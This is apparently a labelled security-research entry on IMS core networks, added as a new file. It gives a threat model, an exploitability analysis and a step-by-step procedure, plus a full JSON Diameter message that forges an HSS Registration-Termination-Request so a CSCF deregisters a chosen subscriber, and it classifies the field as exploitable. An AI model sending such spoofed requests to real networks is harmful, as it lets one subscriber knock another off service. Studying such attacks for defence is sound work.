@@ -1,0 +1,89 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an IMS CSCF on the Cx interface, normally receiving a `Registration-Termination-Request` from the HSS. Due to misconfiguration, the attacker can impersonate the HSS and send forged Cx Diameter requests directly to the CSCF, which accepts them as authoritative.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the CSCF, send crafted `Registration-Termination-Request` messages, and read the returned `Registration-Termination-Answer`. The attacker cannot observe or alter legitimate HSS-CSCF traffic and has no extra SIP/radio/GTP/NAS capabilities, but does know the victim subscriber identity to place in `User-Name`.
+
+### **Exploitability Analysis:**
+`User-Name` in Cx `Registration-Termination-Request` is field-specifically exploitable under this threat model.
+
+This AVP is a top-level, mandatory Diameter base AVP (`Code 1`, `UTF8String`) used by the receiving CSCF as the authoritative subscriber selector for the deregistration action. In an RTR, the CSCF does not treat `User-Name` as descriptive metadata; it uses it as the lookup key to find the local IMS registration/subscriber context that must be terminated.
+
+The field-specific causal chain is direct: a forged RTR is accepted from the spoofed HSS role, the CSCF extracts `User-Name`, locates the matching subscriber registration state, and applies the deregistration/termination indicated by the request. Changing `User-Name` changes which subscriber's IMS registration is removed. That is a concrete incremental control effect of the field itself, not merely a property of the RTR procedure in general.
+
+The resulting impact is targeted IMS service disruption for the selected identity: loss of current registration state, likely SIP-layer unregistration/cleanup, and inability to use IMS services until the UE re-registers. The effect is immediate on receipt and is stored as changed operational registration state at the CSCF. Although later legitimate SIP registration can usually restore service, that recoverability does not negate exploitability; the field still directly drives a subscriber-specific denial of service.
+
+This is therefore not a case where the procedure alone is harmful regardless of field content. The forged RTR creates the termination opportunity, but `User-Name` is the key control point that determines the victim subscriber. Altering it can redirect the termination to any known served user.
+
+### **Attack Procedure:**
+Craft a forged Cx `Registration-Termination-Request` toward the serving CSCF with:
+- Diameter request header for the Cx/Dx application and RTR command,
+- mandatory base AVPs: `Session-Id`, `Origin-Host`, `Origin-Realm`, `Destination-Host`, `Destination-Realm`, `Auth-Application-Id`,
+- target `User-Name` set to the victim subscriber identity,
+- mandatory `Deregistration-Reason` grouped AVP with a valid 3GPP reason code.
+
+Send the request on the attacker-controlled Diameter connection while impersonating the HSS peer identity expected by the CSCF. Success is observable if the CSCF returns a successful `Registration-Termination-Answer` and the targeted subscriber's IMS registration is removed or becomes unreachable until re-registration.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "version": 1,
+    "request": true,
+    "proxiable": true,
+    "command_code": "RTR",
+    "application_id": "CxDx",
+    "hop_by_hop_id": "0x10010001",
+    "end_to_end_id": "0x20020001"
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "vendor_id": 0,
+      "value": "attacker-hss.example.net;1729000001;1"
+    },
+    {
+      "name": "Origin-Host",
+      "vendor_id": 0,
+      "value": "hss01.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "vendor_id": 0,
+      "value": "example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "vendor_id": 0,
+      "value": "scscf01.example.net"
+    },
+    {
+      "name": "Destination-Realm",
+      "vendor_id": 0,
+      "value": "example.net"
+    },
+    {
+      "name": "Auth-Application-Id",
+      "vendor_id": 0,
+      "value": "CxDx"
+    },
+    {
+      "name": "User-Name",
+      "vendor_id": 0,
+      "value": "sip:alice@example.net"
+    },
+    {
+      "name": "Deregistration-Reason",
+      "vendor_id": 10415,
+      "value": {
+        "Reason-Code": "PERMANENT_TERMINATION",
+        "Reason-Info": "Administrative deregistration"
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+- `EXPLOITABLE`
